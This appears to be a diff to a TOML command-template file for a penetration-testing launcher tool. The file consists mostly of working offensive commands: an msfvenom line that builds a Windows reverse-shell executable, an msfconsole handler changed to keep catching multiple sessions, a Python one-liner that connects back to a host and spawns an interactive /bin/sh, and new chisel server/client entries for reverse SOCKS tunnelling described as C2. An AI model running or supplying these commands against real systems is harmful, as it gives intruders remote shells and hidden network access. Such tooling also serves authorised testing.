@@ -12,7 +12,7 @@ examples = [
 [command.Msfvenom]
 use_name = "msfvenom"
 local = true
-cmd_types = "pentest"
+cmd_types = "pentest|craft|code"
 short_desc = "Create reverse shell tcp"
 args = "msfvenom -p <payload|windows/shell_reverse_tcp> LHOST=<ip|127.0.0.1> LPORT=<port|4444> -f <type|exe> > reverse_tcp.exe"
 examples = [
@@ -23,19 +23,32 @@ examples = [
 use_name = "msfconsole"
 local = true
 cmd_types = "pentest"
-short_desc = "Handler reverse shell tcp"
-args = "pentest -q -x 'use exploit/multi/handler;set payload <PAYLOAD|windows/meterpreter/reverse_tcp> ;set LHOST <LHOST|127.0.0.1> ;set LPORT <LPORT|4444> ;run;'"
+short_desc = "Handler reverse shell tcp in loop"
+args = "msfconsole -q -x 'use exploit/multi/handler;set ExitOnSession false;set payload <PAYLOAD|windows/meterpreter/reverse_tcp> ;set LHOST <LHOST|127.0.0.1> ;set LPORT <LPORT|4444> ;run -j;'"
 examples = [
-    "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 127.0.0.1;set LPORT 4444;run;'"
+    "msfconsole -q -x 'use exploit/multi/handler;set ExitOnSession false;set payload windows/meterpreter/reverse_tcp;set LHOST 127.0.0.1;set LPORT 4444;run -j;'"
 ]
 
 [command.ConnectBack]
 use_name = "shell"
 local = false
-cmd_types = "pentest|network|linux"
+cmd_types = "shell"
 short_desc = "reverse shell - connect back and spawn a clean terminal with python subprocess"
 args = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\" <ip|127.0.0.1> \", <port|4444> ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
 examples = [
     "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
 ]
 
+[command.RevshellChiselServer]
+use_name = "chisel server"
+local = false
+cmd_types = "shell"
+short_desc = "Reverse Shell C2 + Reverse connection (chisel)"
+args = "./chisel server --host <ip|127.0.0.1> --port <port|1234> --reverse"
+
+[command.RevshellChiselClient]
+use_name = "chisel client"
+local = false
+cmd_types = "shell"
+short_desc = "Reverse Shell Client + Socks reverse (chisel)"
+args = ".\\chisel.exe client http://<ip|127.0.0.1>:<port|1234> R:socks"
